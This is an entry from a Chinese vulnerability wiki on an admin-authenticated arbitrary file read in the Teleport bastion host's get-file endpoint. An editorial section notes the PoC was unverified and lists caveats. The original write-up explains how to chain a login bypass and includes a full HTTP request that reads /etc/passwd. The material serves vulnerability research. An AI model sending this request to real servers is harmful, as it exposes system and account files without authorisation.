---
source: "wy876 漏洞文库"
id: "vw-7f96c36cc79a1524dc14bf99"
entity_id: "ve-7f96c36cc79a1524dc14bf99"
schema_version: "1"
fofa_unverified: "app.name="
title: "Teleport堡垒机 get-file 后台任意文件读取漏洞"
product: "开源Teleport堡垒机，非齐治"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "后台管理员Cookie，可串do-login绕过；≤20220817声称"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/Teleport%E5%A0%A1%E5%9E%92%E6%9C%BAget-file%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wg3n45g9dgsgstm6"
source_status: "recorded"
---

# Teleport堡垒机 get-file 后台任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：开源Teleport堡垒机，非齐治
- 本文讨论：audit/get-file f任意读取
- 版本、权限与配置前提：后台管理员Cookie，可串do-login绕过；≤20220817声称
- 资料类型：认证后文件读取请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 错误厂商目录，应迁独立Teleport
- 任意登录是可选前置链不是文件读本身匿名；rid=1存在要求未说明
- 无文件返回/版本证据，Hunter元数据错误
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 正确项目、角色/审计记录条件和修复待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者利用任意用户登录漏洞后可以获取后台权限，再进一步利用任意文件读取获取服务器上的敏感文件

# 二、影响版本
+ Teleport堡垒机<= 20220817  


# 三、资产测绘
+ hunter`app.name="Teleport 堡垒机系统"`
+ 特征


# 四、漏洞复现
1. 通过`Teleport堡垒机 do-login 任意用户登录漏洞`登录后台，获取管理员cookie


2. 通过上一步获取到的cookie读取服务器上的文件

```http
GET /audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wg3n45g9dgsgstm6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
